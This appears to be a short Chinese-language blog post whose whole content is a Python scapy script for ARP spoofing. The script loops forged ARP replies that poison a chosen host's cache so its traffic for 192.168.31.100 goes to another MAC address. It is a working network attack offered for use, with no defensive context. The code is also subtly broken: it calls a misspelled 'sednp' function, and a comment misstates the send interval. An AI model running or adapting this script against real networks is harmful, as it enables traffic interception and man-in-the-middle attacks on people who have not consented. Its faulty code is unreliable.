---
title: 简单arp欺骗
date: 2018-05-08
layout: post
tags: Python
---

```python
#-*- coding:utf-8 -*-

from scapy.all import Ether,ARP,sendp
#Ether 用来构建以太网数据包
#ARP   用来ARP数据包的类
#sendp 再第二层发送数据包
def arpspoof():
	eth = Ether()
	arp = ARP()
	arp.op="is-at"                        # 代表ARP请求或者响应
	arp.hwsrc="08:00:27:97:d1:f5"         #发送方mac地址/毒化记录中的mac地址
	arp.psrc="192.168.31.100"             #发送方IP地址/毒化记录中的IP
	arp.hwdst="2C:56:DC:D3:AB:DB"         #目标MAC地址
	arp.pdst="192.168.31.248"             #目标IP地址
	
	##告诉IP为192.168.31.248的主机，IP为192.168.31.100的主机mac地址为08:00:27:97:d1:f5
	##如果不写目标IP与MAC，则默认以广播方式发送
	
	return sednp(eth/arp,inter=2,loop=1)  #在第二层发送封包，并每隔一秒发送一次



```
